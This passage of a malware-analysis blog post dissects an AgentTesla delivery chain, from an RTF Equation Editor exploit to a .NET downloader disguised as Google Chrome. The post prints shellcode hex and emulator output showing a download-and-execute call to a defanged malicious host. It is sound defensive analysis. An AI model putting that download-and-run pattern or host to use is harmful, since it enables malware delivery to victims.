<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="AgentTesla From RTF Exploitation to .NET Tradecraft" /><meta property="og:locale" content="en" /><meta name="description" content="When adversaries buy and deploy threats like AgentTesla you often see this functional and entertaining chain of older exploitation activity with some .NET framework tradecraft you’d expect from some modern implants. In this post I’ll walk through analyzing one such sample that involves RTF/Equation Editor exploitation and a modular downloader that invokes AgentTesla. If you want to follow along at home, the sample is in MalwareBazaar here: https://bazaar.abuse.ch/sample/213d36f7d37abac0df9187e6ce3ed8e26bc61bd3e02a725b079be90d7cfd5117/." /><meta property="og:description" content="When adversaries buy and deploy threats like AgentTesla you often see this functional and entertaining chain of older exploitation activity with some .NET framework tradecraft you’d expect from some modern implants. In this post I’ll walk through analyzing one such sample that involves RTF/Equation Editor exploitation and a modular downloader that invokes AgentTesla. If you want to follow along at home, the sample is in MalwareBazaar here: https://bazaar.abuse.ch/sample/213d36f7d37abac0df9187e6ce3ed8e26bc61bd3e02a725b079be90d7cfd5117/." /><link rel="canonical" href="https://forensicitguy.github.io/agenttesla-rtf-dotnet-tradecraft/" /><meta property="og:url" content="https://forensicitguy.github.io/agenttesla-rtf-dotnet-tradecraft/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-06T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="AgentTesla From RTF Exploitation to .NET Tradecraft" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-28T23:09:20+00:00","datePublished":"2022-02-06T00:00:00+00:00","description":"When adversaries buy and deploy threats like AgentTesla you often see this functional and entertaining chain of older exploitation activity with some .NET framework tradecraft you’d expect from some modern implants. In this post I’ll walk through analyzing one such sample that involves RTF/Equation Editor exploitation and a modular downloader that invokes AgentTesla. If you want to follow along at home, the sample is in MalwareBazaar here: https://bazaar.abuse.ch/sample/213d36f7d37abac0df9187e6ce3ed8e26bc61bd3e02a725b079be90d7cfd5117/.","headline":"AgentTesla From RTF Exploitation to .NET Tradecraft","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/agenttesla-rtf-dotnet-tradecraft/"},"url":"https://forensicitguy.github.io/agenttesla-rtf-dotnet-tradecraft/"}</script><title>AgentTesla From RTF Exploitation to .NET Tradecraft | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/images/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Tony Lambert</a></div><div class="site-subtitle font-italic">An educator that does security things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener"> <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener"> <i class="fab fa-mastodon"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>AgentTesla From RTF Exploitation to .NET Tradecraft</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>AgentTesla From RTF Exploitation to .NET Tradecraft</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1644105600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-02-06 </em> </span> <span> Updated <em class="timeago" data-ts="1648508960" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-28 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3352 words"> <em>18 min</em> read</span></div></div></div><div class="post-content"><p>When adversaries buy and deploy threats like AgentTesla you often see this functional and entertaining chain of older exploitation activity with some .NET framework tradecraft you’d expect from some modern implants. In this post I’ll walk through analyzing one such sample that involves RTF/Equation Editor exploitation and a modular downloader that invokes AgentTesla. If you want to follow along at home, the sample is in MalwareBazaar here: <a href="https://bazaar.abuse.ch/sample/213d36f7d37abac0df9187e6ce3ed8e26bc61bd3e02a725b079be90d7cfd5117/">https://bazaar.abuse.ch/sample/213d36f7d37abac0df9187e6ce3ed8e26bc61bd3e02a725b079be90d7cfd5117/</a>.</p><h2 id="triage-the-document-file"><span class="mr-2">Triage the Document File</span><a href="#triage-the-document-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>MalwareBazaar says we have a DOC file, but it could be wrong so let’s take a look with a couple different tools.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>file orden.doc 
<span class="go">orden.doc: Rich Text Format data, unknown version

</span><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>diec orden.doc 
<span class="go">filetype: Binary
arch: NOEXEC
mode: Unknown
endianess: LE
type: Unknown
  format: RTF
  format: plain text[CR]
</span></pre></table></code></div></div><p>The magic bytes for this file make <code class="language-plaintext highlighter-rouge">file</code> and Detect-It-Easy think the it’s a Rich Text Format file. This file type shifts our analysis path a bit. If the document was a DOC or DOCX format we might expect VBA macros. In this case malicious RTF files commonly contain embedded OLE objects or exploit shellcode for a handful of CVEs in MS Office Equation Editor that are about 5 years old. But the exploits still work. Let’s see which attack path we have here.</p><h2 id="analyzing-the-rtf-document"><span class="mr-2">Analyzing the RTF Document</span><a href="#analyzing-the-rtf-document" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Our first analysis path should be to rule out whether embedded OLE things are in the file. We can do this using a combination of <code class="language-plaintext highlighter-rouge">rtfobj</code> and <code class="language-plaintext highlighter-rouge">rtfdump.py</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>rtfobj orden.rtf 
<span class="go">rtfobj 0.60 on Python 3.8.10 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

===============================================================================
File: 'orden.rtf' - size: 3852 bytes
---+----------+---------------------------------------------------------------
id |index     |OLE Object                                                     
---+----------+---------------------------------------------------------------
0  |00000120h |Not a well-formed OLE object                                   
---+----------+---------------------------------------------------------------
1  |000000CAh |Not a well-formed OLE object                                   
---+----------+---------------------------------------------------------------

</span><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>rtfdump.py <span class="nt">-f</span> O orden.rtf 
<span class="go">
</span><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> 
</span></pre></table></code></div></div><p>The output from <code class="language-plaintext highlighter-rouge">rtfobj</code> and <code class="language-plaintext highlighter-rouge">rtfdump.py</code> both indicate there aren’t OLE objects expected here. If there were we’d likely see an OLE object describing a SCT script file or something similar. So I’m thinking we have RTF Equation Editor exploitation shellcode here. Let’s hunt for that using <code class="language-plaintext highlighter-rouge">rtfdump.py</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>rtfdump.py orden.rtf 
<span class="gp">    1 Level  1        c=    1 p=00000000 l=    3850 h=    3258;</span><span class="w">    </span>3115 <span class="nv">b</span><span class="o">=</span>       0   <span class="nv">u</span><span class="o">=</span>      44 <span class="se">\r</span>tf4818
<span class="gp">    2  Level  2       c=    1 p=00000012 l=    3831 h=    3255;</span><span class="w">    </span>3115 <span class="nv">b</span><span class="o">=</span>       0   <span class="nv">u</span><span class="o">=</span>      38 <span class="se">\o</span>bject18503741
<span class="gp">    3   Level  3      c=    2 p=000000b9 l=    3663 h=    3247;</span><span class="w">    </span>3115 <span class="nv">b</span><span class="o">=</span>       0   <span class="nv">u</span><span class="o">=</span>      38 <span class="se">\*\o</span>bjdata132794
<span class="gp">    4    Level  4     c=    1 p=000000cb l=     274 h=      21;</span><span class="w">      </span>11 <span class="nv">b</span><span class="o">=</span>       0   <span class="nv">u</span><span class="o">=</span>      38 
<span class="gp">    5     Level  5    c=    1 p=000000cc l=     272 h=      21;</span><span class="w">      </span>11 <span class="nv">b</span><span class="o">=</span>       0   <span class="nv">u</span><span class="o">=</span>      38 
<span class="c">...
</span><span class="gp">   68                 c=    0 p=000001ff l=      82 h=      18;</span><span class="w">      </span>18 <span class="nv">b</span><span class="o">=</span>       0   <span class="nv">u</span><span class="o">=</span>       0 <span class="se">\*\l</span>evelprevspace569740588
</pre></table></code></div></div><p>It looks like there are 68 streams here in the document, and we want to inspect the streams starting from largest to smallest until you start finding streams with hardly any data. In this document we’ll focus on the first 3 streams since they’re large.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>rtfdump.py <span class="nt">-H</span> <span class="nt">-s</span> 1 orden.rtf | <span class="nb">head</span>
<span class="gp">00000000: B5 61 85 03 74 16 DF DE  F3 12 CD 0C 6C 23 D2 CC  .a..t.......l#</span>..
<span class="go">00000010: 56 97 40 58 85 69 74 05  88 CA E9 7B 08 02 00 00  V.@X.it....{....
00000020: 00 0B 00 00 00 45 71 55  41 54 69 4F 4E 2E 33 00  .....EqUATiON.3.
00000030: 00 00 00 00 00 00 00 00  19 06 00 00 02 7E 01 EB  .............~..
</span><span class="gp">00000040: 47 0A 01 05 A0 26 3B EC  00 00 00 00 00 00 00 00  G....&amp;;</span>.........
<span class="go">00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000060: 00 50 06 45 00 00 00 00  00 00 00 00 00 00 00 00  .P.E............
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000080: 00 29 C3 44 00 00 00 00  E9 74 01 00 00 03 34 AD  .).D.....t....4.
</span><span class="gp">00000090: 9D 71 6B 52 A9 8A 3B 6E  7B 04 76 FB 3A 6B AB E6  .qkR..;</span>n<span class="o">{</span>.v.:k..
<span class="go">
</span><span class="gp">emnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>rtfdump.py <span class="nt">-H</span> <span class="nt">-s</span> 2 orden.rtf | <span class="nb">head</span>
<span class="go">00000000: 18 50 37 41 6D FD EF 31  2C D0 C6 C2 3D 2C C5 69  .P7Am..1,...=,.i
00000010: 74 05 88 56 97 40 58 8C  AE 97 B0 80 20 00 00 00  t..V.@X..... ...
00000020: B0 00 00 04 57 15 54 15  46 94 F4 E2 E3 30 00 00  ....W.T.F....0..
00000030: 00 00 00 00 00 00 01 90  60 00 00 27 E0 1E B4 70  ........`..'...p
00000040: A0 10 5A 02 63 BE C0 00  00 00 00 00 00 00 00 00  ..Z.c...........
00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 05  ................
00000060: 00 64 50 00 00 00 00 00  00 00 00 00 00 00 00 00  .dP.............
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 02  ................
00000080: 9C 34 40 00 00 00 0E 97  40 10 00 00 33 4A D9 D7  .4@.....@...3J..
00000090: 16 B5 2A 98 A3 B6 E7 B0  47 6F B3 A6 BA BE 67 35  ..*.....Go....g5

</span><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>rtfdump.py <span class="nt">-H</span> <span class="nt">-s</span> 3 orden.rtf | <span class="nb">head</span>
<span class="go">00000000: 6D FD EF 31 2C D0 C6 C2  3D 2C C5 69 74 05 88 56  m..1,...=,.it..V
00000010: 97 40 58 8C AE 97 B0 80  20 00 00 00 B0 00 00 04  .@X..... .......
00000020: 57 15 54 15 46 94 F4 E2  E3 30 00 00 00 00 00 00  W.T.F....0......
00000030: 00 00 01 90 60 00 00 27  E0 1E B4 70 A0 10 5A 02  ....`..'...p..Z.
00000040: 63 BE C0 00 00 00 00 00  00 00 00 00 00 00 00 00  c...............
00000050: 00 00 00 00 00 00 00 00  00 00 00 05 00 64 50 00  .............dP.
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000070: 00 00 00 00 00 00 00 00  00 00 00 02 9C 34 40 00  .............4@.
00000080: 00 00 0E 97 40 10 00 00  33 4A D9 D7 16 B5 2A 98  ....@...3J....*.
00000090: A3 B6 E7 B0 47 6F B3 A6  BA BE 67 35 C7 35 05 7C  ....Go....g5.5.|
</span></pre></table></code></div></div><p>Stream 1 has the string <code class="language-plaintext highlighter-rouge">EqUATiON.3</code> pretty close to its head, so that’s going to be our best bet to keep analysis going. We can extract it using <code class="language-plaintext highlighter-rouge">rtfdump.py</code> again.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>rtfdump.py <span class="nt">-d</span> <span class="nt">-H</span> <span class="nt">-s</span> 1 orden.rtf <span class="o">&gt;</span> 1.dat
<span class="go">
</span><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>file 1.dat 
<span class="go">1.dat: data
</span></pre></table></code></div></div><p>It looks like the first stream exported and gave us some data as expected. For the next step, we need to deduce the entry point of the shellcode. From there we can emulate the shellcode execution. The best way I’ve seen to identify the shellcode entry point so far is to use <code class="language-plaintext highlighter-rouge">xorsearch.py -W</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>xorsearch <span class="nt">-W</span> 1.dat 
<span class="go">Found XOR 00 position 00000201: GetEIP method 2 EB11
Found ROT 25 position 00000201: GetEIP method 2 EB11
Found ROT 24 position 00000201: GetEIP method 2 EB11
Found ROT 23 position 00000201: GetEIP method 2 EB11
Found ROT 22 position 00000201: GetEIP method 2 EB11
Found ROT 21 position 00000201: GetEIP method 2 EB11
Found ROT 20 position 00000201: GetEIP method 2 EB11
Found ROT 19 position 00000201: GetEIP method 2 EB11
Found ROT 18 position 00000201: GetEIP method 2 EB11
Found ROT 17 position 00000201: GetEIP method 2 EB11
Found ROT 16 position 00000201: GetEIP method 2 EB11
Found ROT 15 position 00000201: GetEIP method 2 EB11
Found ROT 14 position 00000201: GetEIP method 2 EB11
Found ROT 13 position 00000201: GetEIP method 2 EB11
Found ROT 12 position 00000201: GetEIP method 2 EB11
Found ROT 11 position 00000201: GetEIP method 2 EB11
Found ROT 10 position 00000201: GetEIP method 2 EB11
Found ROT 09 position 00000201: GetEIP method 2 EB11
Found ROT 08 position 00000201: GetEIP method 2 EB11
Found ROT 07 position 00000201: GetEIP method 2 EB11
Found ROT 06 position 00000201: GetEIP method 2 EB11
Found ROT 05 position 00000201: GetEIP method 2 EB11
Found ROT 04 position 00000201: GetEIP method 2 EB11
Found ROT 03 position 00000201: GetEIP method 2 EB11
Found ROT 02 position 00000201: GetEIP method 2 EB11
Found ROT 01 position 00000201: GetEIP method 2 EB11
Score: 260
</span></pre></table></code></div></div><p>It looks like <code class="language-plaintext highlighter-rouge">xorsearch.py</code> located a GetEIP method used by shellcode to figure out its orientation in memory. We can feed that <code class="language-plaintext highlighter-rouge">00000201</code> offset into our shellcode emulator <code class="language-plaintext highlighter-rouge">scdbg</code>.</p><p>And we get some text output from the emulator to show what the shellcode does (I went ahead and defanged the URL).</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="go">401438  GetProcAddress(ExpandEnvironmentStringsW)
401477  ExpandEnvironmentStringsW(%APPDATA%\zxcbnmgu.exe, dst=12fad8, sz=104)
40148c  LoadLibraryW(UrlMon)
4014a7  GetProcAddress(URLDownloadToFileW)
401503  URLDownloadToFileW(hxxp://scottbyscott[.]com/ebux/try.exe, C:\users\remnux\Application Data\zxcbnmgu.exe)
40151f  GetProcAddress(WideCharToMultiByte)
40153d  WideCharToMultiByte(0,0,in=12fad8,sz=ffffffff,out=12fcf4,sz=104,0,0) = 0
40154d  GetProcAddress(WinExec)
401559  WinExec()
40156d  GetProcAddress(ExitProcess)
401571  ExitProcess(0)
</span></pre></table></code></div></div><p>There are a few Win32 API calls here, but there are only a few for us to worry about. The <a href="https://docs.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-expandenvironmentstringsw"><code class="language-plaintext highlighter-rouge">ExpandEnvironmentStringsW</code></a> function looks like it’s preparing for the adversary to write a file to <code class="language-plaintext highlighter-rouge">%APPDATA%\zxcbnmgu.exe</code>. Next, the <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)"><code class="language-plaintext highlighter-rouge">URLDownloadToFileW</code></a> function retrieves some content from <code class="language-plaintext highlighter-rouge">scottbyscott[.]com</code> and writes the EXE to that file under AppData. Finally, the downloaded application launches and Equation Editor exits using <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess"><code class="language-plaintext highlighter-rouge">ExitProcess</code></a>.</p><p>Now we have some additional EXE content to work with!</p><h2 id="analyzing-the-tryexe-binary"><span class="mr-2">Analyzing the Try.exe Binary</span><a href="#analyzing-the-tryexe-binary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Using Detect-It-Easy we can see the <code class="language-plaintext highlighter-rouge">try.exe</code> binary is a .NET executable.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>diec try.exe 
<span class="go">filetype: PE32
arch: I386
mode: 32-bit
endianess: LE
type: Console
  library: .NET(v4.0.30319)[-]
  linker: Microsoft Linker(48.0)[Console32,console]
</span></pre></table></code></div></div><p>This is a stroke of good fortune for us, because we can pretty easily get this back to source code for inspection. To do so, we can use <code class="language-plaintext highlighter-rouge">ilspycmd</code> and pray there’s no obfuscation.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>ilspycmd try.exe <span class="o">&gt;</span> try.decompiled.cs
<span class="go">
</span><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span><span class="nb">head </span>try.decompiled.cs 
<span class="gp">using System;</span><span class="w">
</span><span class="gp">using System.CodeDom.Compiler;</span><span class="w">
</span><span class="gp">using System.ComponentModel;</span><span class="w">
</span><span class="gp">using System.Configuration;</span><span class="w">
</span><span class="gp">using System.Diagnostics;</span><span class="w">
</span><span class="gp">using System.Globalization;</span><span class="w">
</span><span class="gp">using System.Net.Http;</span><span class="w">
</span><span class="gp">using System.Reflection;</span><span class="w">
</span><span class="gp">using System.Resources;</span><span class="w">
</span><span class="gp">using System.Runtime.CompilerServices;</span><span class="w">
</span></pre></table></code></div></div><p>Awesome, it looks like we got some successful decompilation. Let’s inspect the code.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyTitle</span><span class="p">(</span><span class="s">"Google Chrome"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyDescription</span><span class="p">(</span><span class="s">"Google Chrome"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyConfiguration</span><span class="p">(</span><span class="s">""</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyCompany</span><span class="p">(</span><span class="s">"Google LLC"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyProduct</span><span class="p">(</span><span class="s">"Google Chrome"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyCopyright</span><span class="p">(</span><span class="s">"Copyright 2022 Google LLC. All rights reserved."</span><span class="p">)]</span>
